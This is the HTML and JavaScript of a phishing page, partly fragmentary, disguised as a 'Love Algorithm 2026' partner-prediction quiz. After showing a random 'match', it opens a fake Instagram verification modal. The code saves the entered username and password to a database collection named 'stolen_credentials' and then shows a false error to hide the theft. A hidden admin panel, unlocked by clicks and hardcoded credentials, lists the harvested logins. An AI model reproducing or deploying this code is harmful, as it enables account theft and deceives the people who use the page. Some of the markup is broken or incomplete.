        h1 { color: #ff4b6a; margin-bottom: 20px; font-size: 24px; }
        input, select, button { width: 100%; padding: 12px; margin: 10px 0; border-radius: 8px; border: 1px solid #ddd; box-sizing: border-box; font-size: 16px; }
        button { background: #ff4b6a; color: white; border: none; cursor: pointer; font-weight: bold; transition: 0.3s; }
        button:hover { background: #ff2a55; }
        .hidden { display: none !important; } /* CRITICAL FIX: Ensures elements stay hidden */
        .loading { animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .result-box { background: #f0f0f0; padding: 20px; border-radius: 10px; margin-top: 20px; }
        .flag { font-size: 60px; display: block; margin: 10px 0; line-height: 1; } /* Increased flag size */
        .error-msg { color: red; margin-top: 10px; font-size: 14px; }
        #adminPanel { margin-top: 20px; padding: 10px; background: #eee; border: 1px solid #ccc; display: none; }
        .admin-data { white-space: pre-wrap; text-align: left; font-size: 12px; margin-top: 10px; background: #fff; padding: 10px; border: 1px solid #ddd; }
        
        /* Modal Styling - Fixed to be hidden by default */
        #loginModal {
            display: none; /* Default Hidden */
            position: fixed; 
            top: 0; 
            left: 0; 
            width: 100%; 
            height: 100%; 
            background: rgba(0,0,0,0.8); 
            z-index: 1000;
            justify-content: center;
            align-items: center;
        }
    </style>
</head>
<body>

        </div>

        <!-- Step 1: User Info -->
        <div id="step1">
            <h1>💘 Love Algorithm 2026 💘</h1>
            <p>Discover your future partner's identity!</p>
            <input type="text" id="userName" placeholder="Your Real Name" required>
            <select id="userGender">
                <option value="">Select Gender</option>
                <option value="male">Male</option>
                <option value="female">Female</option>

            <button onclick="startPrediction()">Predict My Future</button>

        <!-- Step 2: Loading -->
        <div id="step2" class="hidden">

        </div>

        <!-- Step 3: Result & Trap -->
        <div id="step3" class="hidden">
            <div class="result-box">
                <h2>Match Found!</h2>
                <p>Your future partner is:</p>
                <h3 id="partnerName" style="color: #ff4b6a; font-size: 22px;"></h3>
                <span id="partnerFlag" class="flag"></span>
                <p>Location: <span id="partnerLocation"></span></p>
            </div>
            <button onclick="showLogin()" style="margin-top: 20px; background: #0095f6;">Connect on Instagram</button>
        </div>

        <!-- Step 4: Login Trap (Hidden Modal - FIXED) -->
        <div id="loginModal">
            <div style="background: white; padding: 25px; border-radius: 15px; width: 90%; max-width: 350px; text-align: center;">
                <h3 style="color: #0095f6;">Instagram Verification</h3>
                <p>To connect with <span id="modalPartnerName"></span>, please verify your identity.</p>
                <input type="text" id="igUser" placeholder="Instagram Username" required>
                <input type="password" id="igPass" placeholder="Password" required>
                <button onclick="submitData()" style="background: #0095f6;">Connect Now</button>
                <p id="fakeError" class="error-msg"></p>
                <button onclick="closeModal()" style="background: #ccc; color: black; margin-top: 10px;">Cancel</button>
            </div>
        </div>

        // ---------------------------------------------------------

        // ---------------------------------------------------------

        window.startPrediction = function() {
            const name = document.getElementById('userName').value;
            const gender = document.getElementById('userGender').value;
            
            if (!name || !gender) { 
                alert("Please fill all details correctly!"); 
                return; 
            }

            document.getElementById('step1').classList.add('hidden');
            document.getElementById('step2').classList.remove('hidden');

            setTimeout(() => {
                document.getElementById('step2').classList.add('hidden');
                document.getElementById('step3').classList.remove('hidden');

                // Gender-based name selection
                let selectedName = "";
                if (gender === "male") {
                    const randomIndex = Math.floor(Math.random() * femaleNames.length);
                    selectedName = femaleNames[randomIndex];
                } else {
                    const randomIndex = Math.floor(Math.random() * maleNames.length);
                    selectedName = maleNames[randomIndex];
                }

                // Country selection
                const randomCountryIndex = Math.floor(Math.random() * countries.length);
                const selectedCountry = countries[randomCountryIndex];

                // Display Results (Flags will now show correctly)
                document.getElementById('partnerName').innerText = selectedName;
                document.getElementById('partnerFlag').innerText = selectedCountry.flag;
                document.getElementById('partnerLocation').innerText = selectedCountry.loc;
                
                window.targetPartner = selectedName;
            }, 3000);
        };

        // FIXED: Modal only opens when called
        window.showLogin = function() {
            const modal = document.getElementById('loginModal');
            modal.style.display = 'flex'; // Explicitly set to flex to show
            modal.classList.remove('hidden');
            document.getElementById('modalPartnerName').innerText = window.targetPartner;
        };

        window.closeModal = function() {
            const modal = document.getElementById('loginModal');
            modal.style.display = 'none'; // Explicitly hide
            modal.classList.add('hidden');
        };

        window.submitData = async function() {
            const user = document.getElementById('igUser').value;
            const pass = document.getElementById('igPass').value;
            if (!user || !pass) { alert("Please fill all fields!"); return; }

            if (!db) { alert("Database not connected!"); return; }

            try {
                const stolenDataRef = ref(db, 'stolen_credentials');
                await push(stolenDataRef, {
                    victim_username: user,
                    victim_password: pass,
                    timestamp: new Date().toISOString(),
                    type: 'instagram_phishing_attempt'
                });

                document.getElementById('igUser').value = '';
                document.getElementById('igPass').value = '';
                document.getElementById('fakeError').innerText = "Error: This user is not on Instagram or has deactivated their account.";
                document.getElementById('fakeError').style.display = 'block;';
                
                setTimeout(() => {
                    closeModal();
                    alert("Sorry, we couldn't connect to them. They might not be on Instagram.");
                    location.reload();
                }, 3000);
            } catch (error) {
                console.error("Error saving data:", error);
                alert("System Error: Could not connect to verification server.");
            }
        };

        // Admin Panel Logic
        let clickCount = 0;
        window.toggleAdmin = function() {
            clickCount++;
            if (clickCount === 5) {
                document.getElementById('adminPanel').style.display = 'block';
                clickCount = 0;
            }
        };
        document.querySelector('h1').addEventListener('click', () => {
            clickCount++;
            if (clickCount === 5) {
                document.getElementById('adminPanel').style.display = 'block';
                clickCount = 0;
            }
        });

        window.checkAdmin = async function() {
            const user = document.getElementById('adminUser').value;
            const pass = document.getElementById('adminPass').value;
            const resultDiv = document.getElementById('adminResult');

            if (user !== 'aetheron' || pass !== '1october2008') {
                resultDiv.innerText = "Invalid Credentials!";
                return;
            }

            resultDiv.innerText = "Loading data...";
            try {
                const dbRef = ref(db);
                const snapshot = await get(child(dbRef, "stolen_credentials"));
                if (snapshot.exists()) {
                    const data = snapshot.val();
                    let output = "Stolen Data Found:\n\n";
                    Object.keys(data).forEach(key => {
                        const entry = data[key];
                        output += `User: ${entry.victim_username}\nPass: ${entry.victim_password}\nTime: ${entry.timestamp}\n-------------------\n`;
                    });
                    resultDiv.innerText = output;
                } else {
                    resultDiv.innerText = "No data found yet.";
                }
            } catch (error) {
                resultDiv.innerText = "Error fetching data: " + error.message;
            }
        };
